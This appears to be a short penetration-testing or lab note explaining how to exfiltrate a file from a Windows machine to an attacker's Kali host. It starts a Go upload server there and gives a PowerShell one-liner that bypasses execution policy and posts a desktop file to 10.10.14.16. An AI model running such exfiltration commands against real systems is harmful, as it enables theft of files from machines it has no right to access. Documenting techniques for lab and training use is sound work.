## Here is a way to upload off windows machine to a webserver on my kail:

https://github.com/mayth/go-simple-upload-server


```
./go-upload-http-nix -port 13005 ./
```

**Powershell to upload:**

```powershell
powershell -nolog -executionpolicy bypass -c "(New-Object System.Net.WebClient).UploadFile('http://10.10.14.16:13005/upload?token=56c987eaebb0203f19b9', 'POST', 'c:\users\phineas\desktop\Oracle issue.txt' )"
```